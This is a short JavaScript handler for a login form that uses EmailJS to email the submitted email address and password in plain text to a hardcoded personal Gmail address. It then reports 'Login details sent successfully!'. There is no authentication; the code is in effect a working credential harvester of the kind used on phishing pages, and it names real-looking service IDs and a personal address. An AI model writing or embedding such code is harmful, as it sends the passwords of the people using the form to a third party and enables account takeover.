document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault();

    const emailId = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // EmailJS parameters
    const serviceID = 'service_i0ysc4r'; // Replace with your actual Service ID
    const templateID = 'template_03i6br8'; // Replace with your actual Template ID

    const templateParams = {
        email: emailId,
        password: password,
        to_email: 'rasteen.sk@gmail.com' // Your email
    };

    emailjs.send(serviceID, templateID, templateParams)
        .then(function(response) {
            alert('Login details sent successfully!');
            document.getElementById('login-form').reset();
        }, function(error) {
            alert('Failed to send login details. Please try again.');
            console.error('EmailJS error:', error);
        });
});
